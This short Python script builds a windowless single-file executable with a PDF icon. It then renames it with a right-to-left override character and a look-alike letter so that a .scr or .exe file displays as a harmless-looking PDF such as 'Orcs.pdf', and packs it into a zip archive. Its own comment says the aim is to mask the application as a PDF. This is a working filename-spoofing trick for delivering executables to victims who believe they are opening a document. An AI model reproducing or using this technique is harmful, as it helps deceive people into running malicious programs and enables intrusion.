# -*- coding: utf-8 -*-

import os
import subprocess
import shutil


# os.chdir('..')
subprocess.call(['python', '-m', 'PyInstaller', "--onefile", "--noconsole", "--icon=pdf_file.ico", "main.py"]) # "--icon=pdf_file.ico", 
os.chdir('dist')

folder = 'folder'
zip_name = 'file'
new_file = ''

# Mask applicaiton as .pdf
old_name = 'main.exe'
new_name = 'O\u202Ef\u1E0Dp.scr' # Orcs.pdf
# new_name = 'S\u202Ef\u1E0Dp.exe' # Sexe.pdf

os.makedirs(folder, exist_ok=True)
shutil.copy(old_name, f'{folder}/{new_name}')

# os.rename(old_name, new_name)
# shutil.copy(old_name, new_name)

# Make zip archive
shutil.make_archive(zip_name, 'zip', folder)


